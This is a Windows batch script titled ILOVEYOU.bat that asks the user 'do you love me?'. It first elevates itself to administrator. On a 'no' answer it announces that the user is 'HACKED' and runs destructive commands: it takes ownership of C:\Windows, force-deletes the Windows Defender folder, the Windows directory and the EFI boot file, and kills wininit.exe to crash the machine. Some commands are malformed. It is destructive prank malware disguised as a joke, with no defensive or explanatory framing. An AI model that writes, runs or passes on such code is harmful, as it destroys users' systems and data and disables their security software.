@echo off
echo Running "C:\Users\WDAGUtilityAccount\Desktop\ILOVEYOU.bat" as Administrator...
powershell "Start-Process "C:\Users\WDAGUtilityAccount\Desktop\ILOVEYOU.bat" -ArgumentList '%filePath%' -Verb RunAs"

@echo off

color a 
echo hello this is a updated and edited version of do you love me :) do you love me? (answer in only yes/no)
set /p input=
if /i %input%==yes goto love
if /i %input%==no goto hate
if /i not %input%== yes,no goto 1

:love
echo I Love You Too...
echo See you later 
pause
exit
:hate
echo But.... I LOVE YOU....lol
echo you just got HACKED LOLOLOLOL
Takeown /f [C:/Windows] /r /d 
echo say hello to the blue screen of death for me your boot is about to be deleted too!!... Oh and one last thing I LOVE YOU!!!!!!!!!
Del /F /Q "C:\Program Files (x86)\Windows Defender"
Del /F /Q C:\Windows 
Del /F /Q "C:\EFI\Boot\bootx64.efi"
@echo off
taskkill /f /im wininit.exe